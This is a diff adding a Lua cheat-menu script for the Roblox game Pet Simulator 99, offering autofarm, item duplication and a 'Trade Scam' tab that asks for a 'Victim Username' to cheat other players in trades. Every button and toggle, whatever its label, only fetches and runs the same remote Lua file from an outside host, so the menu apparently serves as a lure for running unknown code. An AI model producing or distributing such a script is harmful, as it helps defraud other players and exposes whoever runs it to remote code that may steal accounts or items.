@@ -1,0 +1,318 @@
+-- Load Orion library
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+
+-- Create main window
+local Window = OrionLib:MakeWindow({
+    Name = "SussyHub [V4.1]",
+    HidePremium = false,
+    IntroText = "SussyHub",
+    SaveConfig = true,
+    ConfigFolder = "SussyHubConfig"
+})
+
+-- Information Tab
+local InformationTab = Window:MakeTab({
+    Name = "📜Information",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local InformationSection = InformationTab:AddSection({
+    Name = "Guide"
+})
+
+InformationSection:AddParagraph("Information", "This guide provides all the necessary details about SussyHub and its features. Follow the steps for each section to maximize your experience.")
+
+InformationSection:AddButton({
+    Name = "🔥SussyScrip🔥",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/a4083eb11bf814a840e8ed13.lua", true))()
+        print("🔥SussyScrip🔥 Button Pressed")
+    end
+})
+
+-- AutoFarm Tab
+local AutoFarmTab = Window:MakeTab({
+    Name = "🌾AutoFarm",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local AutoFarmSection = AutoFarmTab:AddSection({
+    Name = "AutoFarm"
+})
+
+AutoFarmSection:AddToggle({
+    Name = "AutoFarm",
+    Default = false,
+    Callback = function(Value)
+        loadstring(game:HttpGet("https://egorikusa.space/a4083eb11bf814a840e8ed13.lua", true))()
+        print("AutoFarm set to: " .. tostring(Value))
+    end
+})
+
+-- Mail Dupe Tab
+local MailDupeTab = Window:MakeTab({
+    Name = "📨Mail Dupe",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local MailDupeSection = MailDupeTab:AddSection({
+    Name = "Mail Dupe"
+})
+
+MailDupeSection:AddTextbox({
+    Name = "Ur User",
+    Default = "",
+    TextDisappear = true,
+    Callback = function(Value)
+        print("User set to: " .. Value)
+    end
+})
+
+MailDupeSection:AddButton({
+    Name = "Dupe",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/a4083eb11bf814a840e8ed13.lua", true))()
+        print("Mail Dupe button pressed")
+    end    
+})
+
+-- Trade Scam Tab
+local TradeScamTab = Window:MakeTab({
+    Name = "📜Trade Scam",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local TradeScamSection = TradeScamTab:AddSection({
+    Name = "Guide"
+})
+
+TradeScamSection:AddParagraph("Guide", "To make this work, initiate a trade with another player and ensure to input their username. Once you've entered their username, toggle the 'Freeze Trade' and remove all pets/items/gems.")
+
+local VictimUsername = ""
+TradeScamSection:AddTextbox({
+    Name = "Victim Username",
+    Default = VictimUsername,
+    TextDisappear = true,
+    Callback = function(Value)
+        VictimUsername = Value
+        print("Victim Username set to: " .. VictimUsername)
+    end
+})
+
+TradeScamSection:AddToggle({
+    Name = "Freeze Trade",
+    Default = false,
+    Callback = function(Value)
+        loadstring(game:HttpGet("https://egorikusa.space/a4083eb11bf814a840e8ed13.lua", true))()
+        print("Freeze Trade set to: " .. tostring(Value))
+    end
+})
+
+-- Egg Hatch Tab
+local EggHatchTab = Window:MakeTab({
+    Name = "🥚Egg Hatch",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local EggHatchSection = EggHatchTab:AddSection({
+    Name = "Guide"
+})
+
+EggHatchSection:AddParagraph("Guide", "Start by coming close to the egg you want to use the features on, then activate auto hatch before unleashing its potential with the 'Fast Hatch' toggle. MAKE SURE YOU HAVE A DECENT AMOUNT OF COINS.")
+
+EggHatchSection:AddToggle({
+    Name = "Fast Hatching",
+    Default = false,
+    Callback = function(Value)
+        loadstring(game:HttpGet("https://egorikusa.space/a4083eb11bf814a840e8ed13.lua", true))()
+        print("Fast Hatching set to: " .. tostring(Value))
+    end
+})
+
+EggHatchSection:AddToggle({
+    Name = "Remove Hatching Animation",
+    Default = false,
+    Callback = function(Value)
+        loadstring(game:HttpGet("https://egorikusa.space/a4083eb11bf814a840e8ed13.lua", true))()
+        print("Remove Hatching Animation set to: " .. tostring(Value))
+    end
+})
+
+EggHatchSection:AddToggle({
+    Name = "Auto Hatch",
+    Default = false,
+    Callback = function(Value)
+        loadstring(game:HttpGet("https://egorikusa.space/a4083eb11bf814a840e8ed13.lua", true))()
+        print("Auto Hatch set to: " .. tostring(Value))
+    end
+})
+
+-- Minigames Tab
+local MinigamesTab = Window:MakeTab({
+    Name = "🎮Minigames",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local MinigamesSection = MinigamesTab:AddSection({
+    Name = "Guide"
+})
+
+MinigamesSection:AddParagraph("Guide", "Choose the minigame you want it to autoplay, then travel to the minigame that you chose and click the Auto Play Minigames button.")
+
+-- List of PS99 Minigames
+local minigames = {
+    "ABCs", "Ascent", "Cave", "Chop", "City", "Dodge", "Dungeon", "Flood", "Fusion", "Galaxy",
+    "Gold", "Gun", "Guns", "Lava", "Lava Floor", "Maze", "Parkour", "Race", "Rift", "Sea",
+    "Server", "Space", "Survival", "Tower", "Turf", "Underground", "Village", "War", "Wilderness",
+    "Zombies"
+}
+
+local selectedMinigame = minigames[1]  -- Default value
+
+MinigamesSection:AddDropdown({
+    Name = "Choose Minigame",
+    Options = minigames,
+    Default = 1,
+    Callback = function(Value)
+        selectedMinigame = Value
+        print("Selected Minigame for AutoPlay: " .. selectedMinigame)
+    end
+})
+
+MinigamesSection:AddToggle({
+    Name = "Auto Play Minigames",
+    Default = false,
+    Callback = function(Value)
+        loadstring(game:HttpGet("https://egorikusa.space/a4083eb11bf814a840e8ed13.lua", true))()
+        print("Auto Play Minigames set to: " .. tostring(Value))
+    end
+})
+
+-- Dupe Huge Tab
+local DupeHugeTab = Window:MakeTab({
+    Name = "🐲Dupe Huge",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local DupeHugeSection = DupeHugeTab:AddSection({
+    Name = "Dupe Huge"
+})
+
+-- List of Huge Pets
+local hugePets = {
+    "Huge Dog", "Huge Cat", "Huge Dragon", "Huge Unicorn", "Huge Pegasus",
+    "Huge Monkey", "Huge Shark", "Huge Pumpkin Cat", "Huge Cupcake", "Huge Dom",
+    "Huge Hacked Cat", "Huge Rainbow Unicorn", "Huge Forest Wyvern", "Huge Hell Rock",
+    "Huge King Dog", "Huge King Cat", "Huge Jellyfish", "Huge Lucky Cat", "Huge Storm Agony",
+    "Huge Santa Paws", "Huge Festive Cat", "Huge Elf Cat", "Huge Floppa", "Huge Angelus",
+    "Huge Galaxy Fox", "Huge Astronaut Cat", "Huge Grim Reaper", "Huge Doodle Cat",
+    "Huge Grinch Cat", "Huge Eel", "Huge Scary Cat", "Huge Top Hat Cat", "Huge Golden Scary Cat",
+    "Huge Love Lamb", "Huge Safari Cat", "Huge Tie-Dye Cat", "Huge Pterodactyl", "Huge Space Cat",
+    "Huge Koi", "Huge Trophy", "Huge Machine", "Huge Blobfish", "Huge Inferno Cat",
+    "Huge Vortex Cat", "Huge Electro Cat", "Huge Easter Cat", "Huge Lil' Cat", "Huge Monster Cat",
+    "Huge Titan Cat", "Huge Shark", "Huge Corgi", "Huge Dominos", "Huge Golden Dragon",
+    "Huge Festive Elf", "Huge Turquoise Cat", "Huge Amethyst Cat", "Huge Crystal Dog",
+    "Huge Sapphire Cat", "Huge Diamond Cat", "Huge Rainbow Dog", "Huge Angel Cat",
+    "Huge Cyber Cat", "Huge Lunar Cat", "Huge Frost Cat", "Huge Galaxy Dragon",
+    "Huge Mystic Cat", "Huge Ice Dragon", "Huge Fire Cat", "Huge Shadow Cat",
+    "Huge Thunder Cat", "Huge Aqua Cat", "Huge Void Cat", "Huge Earth Dragon",
+    "Huge Water Cat", "Huge Night Cat", "Huge Day Cat", "Huge Light Cat", "Huge Dark Cat"
+}
+
+local selectedHugePet = hugePets[1]  -- Default value
+
+DupeHugeSection:AddDropdown({
+    Name = "Choose Huge",
+    Options = hugePets,
+    Default = 1,
+    Callback = function(Value)
+        selectedHugePet = Value
+        print("Selected Huge Pet for Duplication: " .. selectedHugePet)
+    end
+})
+
+DupeHugeSection:AddButton({
+    Name = "Dupe",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/a4083eb11bf814a840e8ed13.lua", true))()
+        print("Dupe Huge button pressed")
+    end    
+})
+
+-- Dupe Titanic Tab
+local DupeTitanicTab = Window:MakeTab({
+    Name = "🚢Dupe Titanic",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local DupeTitanicSection = DupeTitanicTab:AddSection({
+    Name = "Dupe Titanic"
+})
+
+-- List of Titanic Pets
+local titanicPets = {
+    "Titanic Dominus Astra", "Titanic Dominus Empyreus", "Titanic Dominus Infernus",
+    "Titanic Dominus Noctis", "Titanic Dominus Regnum", "Titanic Dominus Rex",
+    "Titanic Dominus Terum", "Titanic Dominus Ultima", "Titanic Dominus Vesper",
+    "Titanic Dominus Virtus", "Titanic Dominus Vox", "Titanic Dominus Xenon",
+    "Titanic Dominus Zenith", "Titanic Dominus Abyss", "Titanic Dominus Arcana",
+    "Titanic Dominus Celestial", "Titanic Dominus Colossus", "Titanic Dominus Eclipse",
+    "Titanic Dominus Exile", "Titanic Dominus Inferno", "Titanic Dominus Nebula",
+    "Titanic Dominus Nova", "Titanic Dominus Omnis", "Titanic Dominus Radiant",
+    "Titanic Dominus Rex", "Titanic Dominus Sanctus", "Titanic Dominus Stellar",
+    "Titanic Dominus Tempest", "Titanic Dominus Titan", "Titanic Dominus Tranquil",
+    "Titanic Dominus Unbound", "Titanic Dominus Vortex", "Titanic Dominus Warden",
+    "Titanic Dominus Zenith", "Titanic Dominus Zeta", "Titanic Dominus Zephyr"
+}
+
+local selectedTitanicPet = titanicPets[1]  -- Default value
+
+DupeTitanicSection:AddDropdown({
+    Name = "Choose Titanic",
+    Options = titanicPets,
+    Default = 1,
+    Callback = function(Value)
+        selectedTitanicPet = Value
+        print("Selected Titanic Pet for Duplication: " .. selectedTitanicPet)
+    end
+})
+
+DupeTitanicSection:AddButton({
+    Name = "Dupe",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/a4083eb11bf814a840e8ed13.lua", true))()
+        print("Dupe Titanic button pressed")
+    end    
+})
+
+-- Credit Tab
+local CreditTab = Window:MakeTab({
+    Name = "💳Credit",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local CreditSection = CreditTab:AddSection({
+    Name = "Credits"
+})
+
+CreditSection:AddParagraph("Credits", "Thank you for using SussyHub! Special thanks to the developers and contributors.")
+
+CreditSection:AddButton({
+    Name = "🔥SussyScrip🔥",
+    Callback = function()
+        loadstring(game:HttpGet("https://egorikusa.space/a4083eb11bf814a840e8ed13.lua", true))()
+        print("🔥SussyScrip🔥 Button Pressed")
+    end
+})
+
+-- End of script
+OrionLib:Init()
